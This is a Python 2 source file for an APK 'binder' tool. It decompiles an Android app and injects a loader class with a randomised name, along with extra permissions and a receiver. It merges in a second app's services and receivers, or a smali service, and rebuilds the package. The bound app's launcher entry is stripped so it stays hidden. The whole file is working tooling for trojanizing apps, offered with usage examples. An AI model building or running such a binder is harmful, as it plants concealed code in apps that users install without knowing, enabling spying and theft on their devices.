'''
TODO
    * Controlar excepciones
    * Limitaciones:
        - No se copian los recursos debido a problemas con la recompilacion. 
        - No se copian las actividades debido a que hacen uso de recursos y pueden generar problemas de recompilacion.
'''

__version__ = "v0.1"
__license__ = "Public Domain"
__author__ = "Adri\xe1n Ruiz"

import subprocess
import random
from xml.dom import minidom
import os
import shutil
import sys
import platform
import getopt

ANDROID_MANIFEST = "AndroidManifest.xml"
REPLACE_LOADER_PACKAGE = "net/funsecurity/apk/binder/Loader"
PATH_LOADER_SMALI = os.path.join("loader", "smali", "Loader.smali")
PATH_PROPERTIES_SMALI = os.path.join("loader", "assets", "loader.properties")
LOADER_PERMISSIONS = os.path.join("loader", "permissions.xml")
LOADER_RECEIVER = os.path.join("loader", "receiver.xml")
ACTION_MAIN = "android.intent.action.MAIN"
NO_COPY = \
    [
        os.path.join("smali", "android"),
        "AndroidManifest.xml",
        "apktool.yml",
        os.path.join(" ", "res", "")
    ]

def apk_bind(target_apk, bind_apk, class_bind):

    apktool_bin = config_apktool()

    #Nombre aleatorio de la clase loader
    loader_class = random_string_generator(8)

    '''
    APK Target
    '''
    print "[+] Process", target_apk, "..."

    #Directorio donde almacenar el apk objetivo
    target_dir_smali = os.path.join("tmp", str(random.randint(100000, 999999)))

    #Decompilar apk objetivo
    subprocess.call([os.path.join("apktool", apktool_bin), "d", "-f", target_apk, target_dir_smali])

    #Obtenemos paquete base del apk objetivo
    target_package = get_package_manifest(os.path.join(target_dir_smali, ANDROID_MANIFEST), target_dir_smali)

    if target_package == None:
        print "[x] Problems, package target incorrect"
        sys.exit(1)

    #Parseamos paquete para obtener la ruta en el fs
    target_class_path = target_package.replace(".", "/")

    #Cambiamos la paqueteria en Loader.smali y lo copiamos en la ruta correcta
    prepare_loader_class(target_class_path, loader_class, target_dir_smali)

    #Cambiamos la clase a bindear y lo copiamos en la ruta correcta
    prepare_loader_properties(loader_class, target_dir_smali, class_bind)

    #Editamos el manifest destino estableciendo los permisos correctos y receiver
    prepare_loader_manifest(target_dir_smali, target_package, loader_class)

    print "[+]", target_apk, "processed"

    '''
    APK Binder
    '''
    print "[+] Process", bind_apk, "..."

    #Directorio donde almacenar el apk binder
    binder_dir_smali = os.path.join("tmp", str(random.randint(100000, 999999)))

    #Decompilar apk binder
    subprocess.call([os.path.join("apktool", apktool_bin), "d", "-f", bind_apk, binder_dir_smali])

    #Copiamos todos los datos desde el apk a bindear al destino
    print "[+] Copy files from binder to target..."
    copy_files(binder_dir_smali, target_dir_smali)

    #Copiamos datos del manifest a bindear al destino
    print "[+] Merge manifest..."
    merge_manifest(os.path.join(binder_dir_smali, ANDROID_MANIFEST), os.path.join(target_dir_smali, ANDROID_MANIFEST), binder_dir_smali)

    print "[+]", bind_apk, "processed"

    '''
    Compiling
    '''
    #Compilar apk bindeado
    subprocess.call([os.path.join("apktool", apktool_bin), "b", target_dir_smali, "Bind_" + target_package + ".apk" ])

    #Eliminamos directorios temporales de trabajo
    shutil.rmtree(target_dir_smali)
    shutil.rmtree(binder_dir_smali)

    print "[+] Completed"

def smali_bind(target_apk, smali_bind):

    apktool_bin = config_apktool()

    #Nombre aleatorio de la clase loader
    loader_class = random_string_generator(8)

    '''
    APK Target
    '''
    print "[+] Process", target_apk, "..."

    #Directorio donde almacenar el apk objetivo
    target_dir_smali = os.path.join("tmp", str(random.randint(100000, 999999)))

    #Decompilar apk objetivo
    subprocess.call([os.path.join("apktool", apktool_bin), "d", "-f", target_apk, target_dir_smali])

    #Obtenemos paquete base del apk objetivo
    target_package = get_package_manifest(os.path.join(target_dir_smali, ANDROID_MANIFEST), target_dir_smali)

    if target_package == None:
        print "[x] Problems, package target incorrect"
        sys.exit(1)

    #Parseamos paquete para obtener la ruta en el fs
    target_class_path = target_package.replace(".", "/")

    #Obtenemos paquete y clase del fichero smali
    path_smali_bind = get_smali_class(smali_bind)

    #Cambiamos la paqueteria en Loader.smali y lo copiamos en la ruta correcta
    prepare_loader_class(target_class_path, loader_class, target_dir_smali)

    #Cambiamos la clase a bindear y lo copiamos en la ruta correcta
    prepare_loader_properties(loader_class, target_dir_smali, path_smali_bind.replace("/", "."))

    #Editamos el manifest destino estableciendo los permisos correctos y receiver
    prepare_loader_manifest(target_dir_smali, target_package, loader_class)

    #Inseramos en el manifest destino el service smali
    prepare_smali_manifest(target_dir_smali, path_smali_bind)

    #Copiamos archivo smali en el directorio destino
    copy_smali_file(target_dir_smali, smali_bind, path_smali_bind)

    '''
    Compiling
    '''
    #Compilar apk bindeado
    subprocess.call([os.path.join("apktool", apktool_bin), "b", target_dir_smali, "Bind_" + target_package + ".apk" ])

    #Eliminamos directorios temporales de trabajo
    shutil.rmtree(target_dir_smali)

    print "[+] Completed"

def prepare_smali_manifest(target_dir_smali, path_smali_bind):

    manifest = minidom.parse(os.path.join(target_dir_smali, ANDROID_MANIFEST))
    service = manifest.createElement("service")
    service.setAttribute("android:name", path_smali_bind.replace("/", "."))
    manifest.getElementsByTagName("application")[0].appendChild(service)

    #Guardamos
    fo = open(os.path.join(target_dir_smali, ANDROID_MANIFEST), "wt")
    manifest.writexml(fo)
    fo.close()

def copy_smali_file(target_dir_smali, smali_bind, path_smali_bind):

    os.makedirs(os.path.join(target_dir_smali, "smali", path_smali_bind[:path_smali_bind.rfind("/")]))
    shutil.copy2(smali_bind, os.path.join(target_dir_smali, "smali", path_smali_bind) + ".smali")

def get_smali_class(smali_bind):

    fi = open(smali_bind, "rt")
    smali_file = fi.read(os.path.getsize(smali_bind))
    fi.close()
    return smali_file[smali_file.find("L")+1:smali_file.find(";")]

def merge_manifest(source_manifest, target_manifest, binder_dir_smali):

    s_manifest = minidom.parse(source_manifest)
    t_manifest = minidom.parse(target_manifest)

    s_package = get_package_manifest(source_manifest, binder_dir_smali)

    #Obtenemos grupo de permisos del origen y agregamos en destino
    for child_group_permission in s_manifest.getElementsByTagName("permission-group"):
        t_manifest.getElementsByTagName("manifest")[0].appendChild(child_group_permission)

    #Obtenemos arboles de permisos del origen y agregamos en destino
    for child_tree_permission in s_manifest.getElementsByTagName("permission-tree"):
        t_manifest.getElementsByTagName("manifest")[0].appendChild(child_tree_permission)

    #Obtenemos instrumentacion del origen y agregamos en destino
    for child_instrumentation in s_manifest.getElementsByTagName("instrumentation"):
        t_manifest.getElementsByTagName("manifest")[0].appendChild(child_instrumentation)

    #Obtenemos permisos personalizados del origen y agregamos en destino
    for child_custom_permission in s_manifest.getElementsByTagName("permission"):
        t_manifest.getElementsByTagName("manifest")[0].appendChild(child_custom_permission)

    #Obtenemos features del origen y comprobamos si existen en el destino, de no existir, los agregamos
    for child_feature in s_manifest.getElementsByTagName("uses-feature"):
        feature = child_feature.attributes['android:name'].value
        if feature not in t_manifest.toxml():
            t_manifest.getElementsByTagName("manifest")[0].appendChild(child_feature)

    #Obtenemos permisos del origen y comprobamos si existen en el destino, de no existir, los agregamos
    for child_permission in s_manifest.getElementsByTagName("uses-permission"):
        permission = child_permission.attributes['android:name'].value
        if permission not in t_manifest.toxml():
            t_manifest.getElementsByTagName("manifest")[0].appendChild(child_permission)

    #Obtenemos la aplicacion y todas las actividades para quitar la actividad MAIN
    child_application = s_manifest.getElementsByTagName("application")
    for child_activity in child_application[0].getElementsByTagName("activity"):
        try:
            if ACTION_MAIN in child_activity.getElementsByTagName("intent-filter")[0].getElementsByTagName("action")[0].attributes['android:name'].value :
                child_activity.removeChild(child_activity.getElementsByTagName("intent-filter")[0])
                #child_application[0].removeChild(child_activity.getElementsByTagName("intent-filter")[0])
        except:
            None

    #Obtenemos todos los nodos para obtener el "android:name" y comprobar que tengan el paquete correcto.
    for child_nodes in child_application[0].childNodes:
        try:
            #print child_nodes.attributes['android:name'].value
            if s_package not in child_nodes.attributes['android:name'].value:
                child_nodes.attributes['android:name'].value = s_package + child_nodes.attributes['android:name'].value
        except:
            None

    #Agregamos providers
    for child in child_application[0].getElementsByTagName("provider"):
        t_manifest.getElementsByTagName("application")[0].appendChild(child)

    #Agregamos services
    for child in child_application[0].getElementsByTagName("service"):
        t_manifest.getElementsByTagName("application")[0].appendChild(child)

	'''
    #Agregamos activities
    for child in child_application[0].getElementsByTagName("activity"):
        t_manifest.getElementsByTagName("application")[0].appendChild(child)

    #Agregamos activity-alias
    for child in child_application[0].getElementsByTagName("activity-alias"):
        t_manifest.getElementsByTagName("application")[0].appendChild(child)
	'''
	
    #Agregamos receivers
    for child in child_application[0].getElementsByTagName("receiver"):
        t_manifest.getElementsByTagName("application")[0].appendChild(child)

    #Agregamos meta-data
    for child in child_application[0].getElementsByTagName("meta-data"):
        t_manifest.getElementsByTagName("application")[0].appendChild(child)

    #Agregamos libs
    for child in child_application[0].getElementsByTagName("uses-library"):
        t_manifest.getElementsByTagName("application")[0].appendChild(child)

    #print t_manifest.toxml()

    #Guardamos
    fo = open(target_manifest, "wt")
    t_manifest.writexml(fo)
    fo.close()

def copy_files(source_folder, target_folder):

    for root, dirs, files in os.walk(source_folder):
        for file in files:
            next = False
            #Obtenemos archivo origen a copiar
            tf = os.path.join(root, file)
            #Comprobamos la lista negra para no copiar
            for nc in NO_COPY:
                if nc.strip() in tf:
                    next = True
                    break
            if next: continue
            tf = tf.replace(source_folder, target_folder)
            #Si el archivo existe en el destino
            if os.path.exists(tf): continue
            else:
                try:
                    os.makedirs(root.replace(source_folder, target_folder))
                except:
                    None
                shutil.copy2(os.path.join(root, file), tf)

def prepare_loader_manifest(target_dir_smali, target_package, loader_class):

    manifest = minidom.parse(os.path.join(target_dir_smali, ANDROID_MANIFEST))

    #Comprobamos los permisos destino. De no existir los damos de alta
    permissions = minidom.parse(LOADER_PERMISSIONS)
    for child_permission in permissions.getElementsByTagName("uses-permission"):
        permission = child_permission.attributes['android:name'].value
        if permission not in manifest.toxml():
            manifest.getElementsByTagName("manifest")[0].appendChild(child_permission)

    #Agregamos receiver
    receiver = minidom.parse(LOADER_RECEIVER)
    receiver.getElementsByTagName("receiver")[0].attributes['android:name'].value = target_package + "." + loader_class
    manifest.getElementsByTagName("application")[0].appendChild(receiver.getElementsByTagName("receiver")[0])

    #Guardamos
    fo = open(os.path.join(target_dir_smali, ANDROID_MANIFEST), "wt")
    manifest.writexml(fo)
    fo.close()

def prepare_loader_properties(propertie_name, target_dir_smali, class_bind):

    fi = open(PATH_PROPERTIES_SMALI, "rt")
    loader_properties = fi.read(os.path.getsize(PATH_PROPERTIES_SMALI))
    fi.close()
    loader_properties = loader_properties.replace(REPLACE_LOADER_PACKAGE, class_bind)

    #Si no existe la carpeta "assets", la creamos
    if not os.path.exists(os.path.join(target_dir_smali, "assets")):
        os.makedirs(os.path.join(target_dir_smali, "assets"))

    fo = open(os.path.join(target_dir_smali, "assets", propertie_name + ".properties"), "wt")
    fo.write(loader_properties)
    fo.close()

def prepare_loader_class(class_path, loader_class, target_dir_smali):

    fi = open(PATH_LOADER_SMALI, "rt")
    l_class = fi.read(os.path.getsize(PATH_LOADER_SMALI))
    fi.close()
    l_class = l_class.replace(REPLACE_LOADER_PACKAGE, class_path + "/" + loader_class)
    l_class = l_class.replace("Loader.java", loader_class + ".java")
    l_class = l_class.replace("loader.properties", loader_class + ".properties")

    fo = open(os.path.join(target_dir_smali, "smali", class_path, loader_class + ".smali"), "wt")
    fo.write(l_class)
    fo.close()

def get_package_manifest(manifest_file, target_dir_smali):

    manifest = minidom.parse(manifest_file)
    root_manifest = manifest.getElementsByTagName("manifest")
    #Obtenemos el package del manifest, en caso de ser incorrecto, obtenemos los packages desde los activities
    if os.path.exists(os.path.join(target_dir_smali, "smali", root_manifest[0].attributes["package"].value.replace(".", os.sep))) == True:
        return root_manifest[0].attributes["package"].value
    else:
        for child in manifest.getElementsByTagName("activity"):
            package = child.attributes['android:name'].value
            if "." in package:
                package = package[0:package.rfind(".")]
                if "." in package: return package
                else: continue
        return None

def random_string_generator(size=6):

    chars = "abcdefghijklmnopqrstuvwxyz"
    return "".join(random.choice(chars) for x in range(size))

def config_apktool():

    #Obtener sistema
    if "windows" in platform.system().lower():
        apktool_bin = "apktool.bat"
        environ_delimiter = ";"
    else:
        apktool_bin = "apktool"
        environ_delimiter = ":"

    #Set path de apktool
    os.environ['PATH'] = os.environ['PATH'] + environ_delimiter + os.path.abspath(os.path.join("apktool", ""))

    return apktool_bin

def get_params():

    target_apk = None
    smali_bind_file = None
    bind_apk = None
    class_bind = None

    try:
        opts, args = getopt.getopt(sys.argv[1:], "t:b:c:s:")
        for opt, arg in opts:
            if opt == "-t":
                target_apk = arg
            elif opt == "-b":
                bind_apk = arg
            elif opt == "-c":
                class_bind = arg
            elif opt == "-s":
                smali_bind_file = arg

        if target_apk is None:
            print "[x] -t param apk target required"
        elif smali_bind_file != None:
            print "[+] smali bind mode"
            smali_bind(target_apk, smali_bind_file)
        elif bind_apk is None:
            print "[x] insufficient parameters, specify [-b -c] or -s"
        elif class_bind is None:
            print class_bind
            print "[x] insufficient parameters, specify [-b -c] or -s"
        else:
            print "[+] apk bind mode"
            apk_bind(target_apk, bind_apk, class_bind)
    except getopt.GetoptError:
        usage()

def usage():

    print "Usage:",  sys.argv[0], "[OPTIONS]\n"
    print "---------------------------------------------------"
    print " -t*     apk target"
    print " -b      apk bind on target"
    print " -c      class to invoke when the event is revealed"
    print " -s      class smali to bind"
    print "---------------------------------------------------\n"
    print "Examples:\n"
    print "# smali bind to apk\n"
    print sys.argv[0], "-t apk_target.apk -s service_bind.smali\n"
    print "# apk bind to apk\n"
    print sys.argv[0], "-t apk_target.apk -b apk_bind.apk -c class.service.to.invoke.from.bind\n"
    print "*** Permissions smali code must match the destination apk, otherwise it will not work."

def version():

    print ""
    print "apk_binder_script", __version__, "|", __author__, "| adrian@adrianruiz.net | @funsecurity | www.funsecurity.net"
    print ""

def init():

    version()

    if len(sys.argv) < 4:
        usage()
    else:
        get_params()

if __name__ == "__main__":
	init()